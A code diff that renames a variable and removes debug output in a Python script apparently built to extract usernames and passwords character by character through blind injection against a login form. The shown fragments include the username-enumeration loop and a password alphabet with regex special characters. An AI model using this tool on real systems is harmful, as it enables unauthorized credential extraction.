@@ -10,7 +10,7 @@ try:
 except ImportError:
     from bs4 import BeautifulSoup
 
-ugly = 0
+counter = 0
 username = "admin"
 user_param = "username"
 password_param = "password"
@@ -208,7 +208,7 @@ def authenticate():
         main()
 
 def get_username(username):
-    global ugly
+    global counter
     alphabet = list(string.ascii_letters) + list(string.digits)
     while True: 
         for c in alphabet:
@@ -224,17 +224,15 @@ def get_username(username):
                 return
 
             if is_successfull(success_string, response):
-                ugly = ugly + 1
-                log(f"Ugly is now {ugly}")
+                counter = counter + 1
                 get_username(username + c)
 
             if c == alphabet[-1]:
-                # log(f"Ugly is now {ugly}")
                 if len(username):
-                    if ugly == len(username) - 1 and ugly != 0:
+                    if counter == len(username) - 1 and counter != 0:
                         log(f"Username length: {len(username)}")
                         log(f"User found: '{username}'")
-                        ugly = 0
+                        counter = 0
                         return
                     else:
                         return
@@ -269,7 +267,6 @@ def get_usernames():
 def get_password(username, pw_length):
     password = ""
     alphabet = string.printable
-    print(alphabet)
     regex_chars = ['.', '^', '*', '+', '-', '?', '$', '\\', '|']
     count = pw_length-1
 
